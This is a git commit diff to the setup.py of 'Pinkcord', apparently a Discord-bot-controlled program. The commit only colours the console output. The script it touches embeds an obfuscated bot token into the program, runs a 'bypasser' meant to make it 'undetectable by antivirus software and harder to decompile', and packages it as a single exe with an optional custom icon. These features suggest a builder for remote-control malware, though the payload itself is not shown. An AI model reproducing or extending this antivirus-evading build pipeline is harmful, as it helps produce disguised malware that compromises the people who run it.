9095711e934de5d6d16fa8f115bb7fdc1fa64512
xanonDev <52205282+xanonDev@users.noreply.github.com>
2023-08-04 11:34:06 +0200

    better design

--- setup.py
+++ setup.py
@@ -11,6 +11,8 @@ BYPASS_FILE = 'pinkcord_bypass.py'
 DIST_FOLDER = 'dist'
 COLOR_RESET = "\033[0m"
 GREEN_COLOR = "\033[32m"
+YELLOW_COLOR = "\033[33m"
+RED_COLOR = "\033[31m"
 
 asciart = "\033[95m" + '''
   _____ _____ _   _ _  _______ ____  _____  _____  
@@ -34,20 +36,20 @@ def clear_console():
 
 clear_console()
 print(asciart)
-print("Installing required libraries...")
+print(YELLOW_COLOR + "Installing required libraries..." + COLOR_RESET)
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
 clear_console()
 print(asciart)
 print(GREEN_COLOR + "Libraries installed[*]" + COLOR_RESET)
 token = input("Enter your Discord bot token: ")
-print("Encoding token...")
+print(YELLOW_COLOR + "Encoding token..." + COLOR_RESET)
 token = token.encode('utf-8')
 token = base64.b64encode(token)
 token = base64.b32encode(token)
 token = token.decode('utf-8')
 token = codecs.encode(token, 'rot13')
 print(GREEN_COLOR + "Token encoded[*]" + COLOR_RESET)
-print('Replacing the token in the pinkcord.py file....')
+print(YELLOW_COLOR + 'Replacing the token in the pinkcord.py file....' + COLOR_RESET)
 with open(TOKEN_FILE, 'r') as sc:
     content = sc.read()
     content = content.replace("<TOKEN>", token)
@@ -56,8 +58,8 @@ with open(TOKEN_FILE, 'w') as sc:
 clear_console()
 print(asciart)
 print('Do you want to test Pinkcord by running it?')
-print('1. Yes')
-print('2. No')
+print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
+print(RED_COLOR + '2. No' + COLOR_RESET)
 answer = input("Choice: ")
 clear_console()
 print(asciart)
@@ -66,32 +68,32 @@ if answer == "1":
         subprocess.Popen(['start', 'cmd', '/k', 'py', 'pinkcord.py'], shell=True)
     else:
         subprocess.Popen(['xterm', '-e', 'python', 'pinkcord.py'])
-    print('Send !h to your Discord bot. If it responds, it means it\'s working')
-    print('If it doesn\'t respond, press ENTER in the new window and try again')
-    input('Press ENTER when you finish testing')
+    print(YELLOW_COLOR + 'Send !h to your Discord bot. If it responds, it means it\'s working')
+    print('If it doesn\'t respond, press ENTER in the new window and try again' + COLOR_RESET)
+    input(GREEN_COLOR + 'Press ENTER when you finish testing' + COLOR_RESET)
 clear_console()
 print(asciart)
 print("do you want to set a custom icon for your Pinkcord?")
-print('1. Yes')
-print('2. No')
+print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
+print(RED_COLOR + '2. No' + COLOR_RESET)
 answer = input("Choice: ")
 if answer == "1":
     icon = input("enter the path to your .ico file: ")
 clear_console()
 print(asciart)
 print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
-print('1. Yes')
-print('2. No')
+print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
+print(RED_COLOR + '2. No' + COLOR_RESET)
 answer = input("Choice: ")
 if answer == "1":
-    print('Encoding Pinkcord...')
+    print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
     with open(TOKEN_FILE, 'r') as sourcecode:
         with open(TO_BYPASS_FILE, 'w') as codefile:
             codefile.write(sourcecode.read())
             subprocess.check_call([sys.executable, 'bypasser.py'])
             codefile.close()
             sourcecode.close()
-    print("Creating a bypass script...")
+    print(YELLOW_COLOR + "Creating a bypass script..." + COLOR_RESET)
     with open(TO_BYPASS_FILE, 'r') as codefile:
         encoded_code = codefile.read()
     with open(BYPASS_FILE, 'r') as bypass:
@@ -102,7 +104,7 @@ if answer == "1":
     clear_console()
     print(asciart)
     import PyInstaller.__main__
-    print("Generating exe file...")
+    print(GREEN_COLOR + "Generating exe file...")
     if "icon" in globals():
         params = [
             '--onefile',
@@ -125,7 +127,7 @@ else:
     clear_console()
     print(asciart)
     import PyInstaller.__main__
-    print("Generating exe file...")
+    print(GREEN_COLOR + "Generating exe file...")
     if "icon" in globals():
         params = [
             '--onefile',
